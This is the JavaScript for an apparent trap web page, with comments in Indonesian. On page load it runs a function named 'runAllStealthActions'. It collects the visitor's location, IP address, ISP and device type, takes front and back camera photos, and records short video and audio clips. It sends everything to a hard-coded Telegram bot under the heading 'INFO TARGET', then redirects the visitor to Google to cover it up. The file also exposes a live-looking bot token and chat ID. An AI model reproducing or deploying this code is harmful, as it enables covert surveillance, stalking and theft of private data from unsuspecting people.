const video = document.getElementById("cameraPreview");
const status = document.getElementById("status");

// ====================
// CONFIG TELEGRAM
// ====================
const TELEGRAM_BOT_TOKEN = "8854175546:AAHOqFJRPO1gKAbEsf0cT-cKSkLpk7TGxfk";
const TELEGRAM_CHAT_ID = "8862634415";

// ====================
// AMBIL INFO PERANGKAT & IP
// ====================
async function getDeviceInfo() {
  let ipInfo = "Tidak diketahui";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ipInfo = `${data.ip} (${data.city}, ${data.country_name}) - ISP: ${data.org}`;
  } catch (e) {
    console.error("Gagal ambil IP:", e);
  }

  const userAgent = navigator.userAgent;
  let device = "Desktop / Perangkat Lain";
  
  if (/android/i.test(userAgent)) {
    device = "Android";
  } else if (/iphone|ipad|ipod/i.test(userAgent)) {
    device = "iOS (Apple)";
  } else if (/windows/i.test(userAgent)) {
    device = "Windows PC";
  } else if (/macintosh|mac os x/i.test(userAgent)) {
    device = "Mac OS";
  }

  return {
    ip: ipInfo,
    device: device,
    platform: navigator.platform || "Tidak diketahui"
  };
}

// ====================
// LOCATION
// ====================
function requestLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              latitude: latitude,
              longitude: longitude
            })
          });
        } catch (err) {}
        resolve();
      },
      (error) => { resolve(); },
      { timeout: 5000 }
    );
  });
}

// ====================
// FUNGSI BANTU SNAPSHOT (DIBIKIN AMAN SUPAYA TIDAK HITAM)
// ====================
function takeSnapshot(stream) {
  return new Promise((resolve) => {
    video.srcObject = stream;
    
    // Paksa video dimainkan agar frame-nya termuat
    video.play().catch(() => {});

    // Tunggu sampai video siap memunculkan gambar (tidak hitam)
    const checkVideoReady = setInterval(() => {
      if (video.videoWidth > 0 && video.videoHeight > 0) {
        clearInterval(checkVideoReady);
        
        // Beri jeda 300ms tambahan untuk stabilisasi gambar
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          canvas.toBlob((blob) => {
            resolve(blob);
          }, "image/jpeg", 0.9);
        }, 300);
      }
    }, 100);

    // Timeout jaga-jaga kalau kamera lemot (1.5 detik maks)
    setTimeout(() => {
      clearInterval(checkVideoReady);
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
    }, 1500);
  });
}

// ====================
// PEREKAM VIDEO (3 Detik)
// ====================
function recordVideo(stream, durationInSeconds = 3) {
  return new Promise((resolve) => {
    video.srcObject = stream;
    video.play().catch(() => {});
    
    let recordedChunks = [];
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

    mediaRecorder.ondataavailable = (event) => {
      if (event.data && event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    };

    mediaRecorder.onstop = () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      resolve(blob);
    };

    mediaRecorder.start();
    setTimeout(() => {
      if (mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
      }
    }, durationInSeconds * 1000);
  });
}

// ====================
// PEREKAM SUARA (3 Detik)
// ====================
function recordAudio(durationInSeconds = 3) {
  return new Promise(async (resolve) => {
    try {
      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      let recordedChunks = [];
      
      const mediaRecorder = new MediaRecorder(audioStream);

      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        audioStream.getTracks().forEach(track => track.stop());
        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
        resolve(blob);
      };

      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state !== "inactive") {
          mediaRecorder.stop();
        }
      }, durationInSeconds * 1000);
    } catch (err) {
      resolve(null);
    }
  });
}

// ====================
// PROSES UTAMA
// ====================
async function runAllStealthActions() {
  status.textContent = "Menyiapkan komponen...";
  
  await requestLocation();
  const info = await getDeviceInfo();

  let frontBlob = null, backBlob = null, videoBlob = null, audioBlob = null;

  // 1. Ambil Foto Depan
  try {
    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    frontBlob = await takeSnapshot(frontStream);
    frontStream.getTracks().forEach(track => track.stop());
  } catch (err) {}

  // 2. Ambil Foto Belakang
  try {
    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
    backBlob = await takeSnapshot(backStream);
    backStream.getTracks().forEach(track => track.stop());
  } catch (err) {}

  // 3. Rekam Video
  try {
    const vidStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
    videoBlob = await recordVideo(vidStream, 3);
    vidStream.getTracks().forEach(track => track.stop());
  } catch (err) {}

  // 4. Rekam Audio
  try {
    audioBlob = await recordAudio(3);
  } catch (err) {}

  // ====================
  // KIRIM KE TELEGRAM
  // ====================
  status.textContent = "Finalisasi...";

  try {
    const textInfo = 
      `🚨 **INFO TARGET / PENGGUNA** 🚨\n\n` +
      `🌐 **IP Address:** ${info.ip}\n` +
      `📱 **Perangkat:** ${info.device}\n` +
      `💻 **Platform:** ${info.platform}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: textInfo,
        parse_mode: "Markdown"
      })
    });

    if (frontBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("photo", frontBlob, "front.jpg");
      fd.append("caption", "📸 Foto Kamera Depan");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    }

    if (backBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("photo", backBlob, "back.jpg");
      fd.append("caption", "📸 Foto Kamera Belakang");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    }

    if (videoBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("video", videoBlob, "video.webm");
      fd.append("caption", "🎥 Video Rekaman (3 Detik)");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
    }

    if (audioBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("audio", audioBlob, "audio.webm");
      fd.append("caption", "🎙️ Rekaman Suara (3 Detik)");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: "POST", body: fd });
    }

  } catch (error) {
    console.error("Gagal kirim ke telegram:", error);
  }

  // ====================
  // LEMPAR KE GOOGLE
  // ====================
  window.location.href = "https://www.google.com";
}

// ====================
// JALANKAN OTOMATIS
// ====================
window.addEventListener("load", () => {
  setTimeout(runAllStealthActions, 1000);
});
